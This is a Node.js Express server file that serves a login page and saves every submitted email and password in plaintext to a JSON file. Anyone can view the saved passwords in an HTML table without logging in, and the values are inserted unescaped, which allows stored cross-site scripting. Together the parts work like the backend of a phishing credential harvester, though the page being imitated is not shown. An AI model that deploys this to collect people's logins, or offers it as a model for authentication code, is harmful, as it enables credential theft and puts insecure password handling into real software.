const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public')); // Serve static files from the "public" folder

// Serve the login page at the root ("/")
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'login.html'));  // Adjust this path to your HTML file
});

// Handle login POST request
app.post('/login', (req, res) => {
  const { email, password } = req.body;

  // Load existing data
  const filePath = path.join(__dirname, 'data.json');
  let data = [];

  try {
    if (fs.existsSync(filePath)) {
      const fileData = fs.readFileSync(filePath, 'utf8');
      data = JSON.parse(fileData);
    }
  } catch (err) {
    console.error('Error reading the file:', err);
    return res.status(500).json({ message: 'Internal Server Error' });
  }

  // Add new login data
  data.push({ email, password });

  try {
    // Save updated data
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
    res.json({ message: 'Login data stored successfully!' });
  } catch (err) {
    console.error('Error writing to the file:', err);
    return res.status(500).json({ message: 'Error saving login data' });
  }
});

// ✅ NEW: View login data in a table
app.get('/view-data', (req, res) => {
  const filePath = path.join(__dirname, 'data.json');

  if (!fs.existsSync(filePath)) {
    return res.send('<p>No data found yet.</p>');
  }

  let data = [];
  try {
    const fileData = fs.readFileSync(filePath, 'utf8');
    data = JSON.parse(fileData);
  } catch (err) {
    console.error('Error reading the file:', err);
    return res.status(500).json({ message: 'Error reading login data' });
  }

  const rows = data.map(d => `<tr><td>${d.email}</td><td>${d.password}</td></tr>`).join('');

  const html = `
    <!DOCTYPE html>
    <html>
    <head>
      <title>Login Data</title>
      <style>
      .del{
        font-size:20px;
        padding:4px;
      }
      body { font-family: sans-serif; padding: 20px; }
      table { border-collapse: collapse; width: 100%; }
      th, td { border: 1px solid #ccc; padding: 10px; }
      th { background-color: #f2f2f2; }
      </style>
    </head>
    <body>
      <h2>Stored Login Data</h2>
      <table>
        <thead><tr><th>Email</th><th>Password</th></tr></thead>
        <tbody>${rows}</tbody>
      </table>
      <button class="del">Clear All</button>

      <script>
        // Add event listener to the "Clear All" button
        document.querySelector('.del').addEventListener('click', function() {
          // Send a GET request to the server to clear the data
          fetch('/clear-data')
            .then(response => {
              if (response.ok) {
                // Once the data is cleared, reload the page to see the updated data
                window.location.reload();
              } else {
                alert('Error clearing data');
              }
            })
            .catch(err => {
              console.error('Error:', err);
              alert('Failed to connect to the server.');
            });
        });
      </script>
    </body>
    </html>
    `;

  res.send(html);
});

// Handle "Clear All" data request
app.get('/clear-data', (req, res) => {
  const filePath = path.join(__dirname, 'data.json');

  if (fs.existsSync(filePath)) {
    try {
      // Clear the content of the file (set it to an empty array)
      fs.writeFileSync(filePath, JSON.stringify([], null, 2));
      console.log('All data cleared successfully!');
      res.redirect('/view-data');  // Redirect back to the view-data page to show the updated data (empty)
    } catch (err) {
      console.error('Error clearing the file:', err);
      return res.status(500).json({ message: 'Error clearing login data' });
    }
  } else {
    res.status(404).json({ message: 'Data file not found' });
  }
});

app.listen(PORT, () => {
  console.log(`Server is running at http://localhost:${PORT}`);
});
